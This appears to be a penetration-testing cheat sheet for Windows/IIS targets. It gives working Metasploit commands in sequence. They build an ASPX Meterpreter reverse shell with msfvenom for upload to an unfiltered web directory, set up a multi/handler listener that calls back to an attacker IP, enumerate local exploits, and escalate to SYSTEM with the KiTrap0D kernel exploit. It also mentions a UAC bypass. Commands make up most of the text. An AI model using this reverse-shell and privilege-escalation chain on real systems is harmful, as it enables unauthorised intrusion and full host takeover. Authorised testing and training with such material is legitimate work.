## MSFVenom Payload Generation

When to use: Web-accessible directory allows file uploads without extension filtering and the target environment supports specific execution engines like ASP.NET.

Generate an ASPX Meterpreter reverse shell for Windows targets

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f aspx > <FILE_PATH>
```

- **Gotchas**
    - **Meterpreter session dies**; payloads may require encoding to improve runtime stability and avoid immediate termination.

---

## Catching Reverse Connections

When to use: Ready to trigger a staged or non-staged payload on a target and need a local listener to handle the callback.

Configure a generic listener for incoming payloads

```
msfconsole -q
use multi/handler
set LHOST <ATTACK_IP>
set LPORT <PORT>
run
```

- **Gotchas**
    - **Payload mismatch**; the handler must be configured with the exact payload type used during generation to receive the connection.

---

## Local Enumeration for Privilege Escalation

When to use: Initial shell established as a low-privileged user (e.g., `IIS APPPOOL\Web`) and manual enumeration for misconfigurations or kernel vulnerabilities is required.

Identify potential local exploits for a specific active session

```
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run
```

- **Edge cases**
    
    - **x86 architecture**; the `local_exploit_suggester` is particularly reliable when the system architecture is confirmed as 32-bit.
- **Gotchas**
    
    - **False positives**; suggested exploits are not 100% accurate and may fail depending on target environment variables.

---

## Kernel Exploit Execution

When to use: Local discovery tools identify a high-confidence vulnerability like `KiTrap0D` on a target with an outdated OS version.

Execute a local privilege escalation module to gain SYSTEM

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <SESSION_ID>
set LPORT <PORT>
run
```

- **Dangerous / misconfigured settings**
    
    - **LPORT reuse**; ensure the listener for the privesc exploit uses a different port than the initial foothold session to avoid conflicts.
- **Gotchas**
    
    - **Insufficient permissions**; exploits like `bypassuac_eventvwr` will fail if the current user is not a member of the **Administrators group**.

> ⚠️ Gap: The source mentions using encoders to prevent the Meterpreter session from dying but does not list specific encoder modules or the `-e` flag syntax required to implement them.